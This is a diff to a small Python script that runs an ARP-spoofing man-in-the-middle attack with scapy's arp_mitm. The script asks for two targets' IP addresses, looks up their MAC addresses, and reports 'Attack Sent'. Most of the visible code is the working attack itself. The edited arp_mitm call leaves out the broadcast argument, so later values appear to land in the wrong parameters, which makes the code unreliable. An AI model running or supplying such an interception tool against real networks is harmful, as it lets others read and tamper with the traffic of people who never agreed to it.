@@ -1,12 +1,11 @@
 #! /usr/bin/python
-from scapy.layers.l2 import Ether, ARP
-import scapy.all as scapy
-import time
+from scapy.layers.l2 import arp_mitm
+import scapy.all
 
 
 def attack(T1ip, T2ip, T1MAC, T2MAC, Attacker, iface):
     # mac1 and mac2 are optional, will arp if not provided, broadcast makes broadcast default, target_mac is your MAC address- defaults to your interfaces one, iface is for the name of the network interface, defaults to route for ip1
-    scapy.layers.l2.arp_mitm(T1, T2, T1MAC, T2MAC, False, Attacker, iface)
+    scapy.layers.l2.arp_mitm(T1ip, T2ip, T1MAC, T2MAC, Attacker, iface)
     # scapy.layers.l2.arp_mitm("0.0.0.0", "0.0.0.0", "ff-ff-ff-ff-ff-ff", "ff-ff-ff-ff-ff-ff", False, "ff-ff-ff-ff-ff-ff", "Ethernet2")
     # scapy.layers.l2.arp_mitm(ip1, ip2, mac1, mac2 ,Broadcast, target_mac, iface)
     return "Attack Sent"
@@ -58,7 +57,7 @@ if __name__ == '__main__':
     T2 = input("Enter Target2's IP Address")
     Attacker = input("What is your own MAC address")
     uip = input("What is your IP Address?")
-    iface = input("Enter the name of your Network Interface");
+    iface = input("Enter the name of your Network Interface")
     Mac1 = scapy.layers.l2.getmacbyip(T1, 0)
     Mac2 = scapy.layers.l2.getmacbyip(T2, 0)
     print(attack(T1, T2, Mac1, Mac2, Attacker, iface))
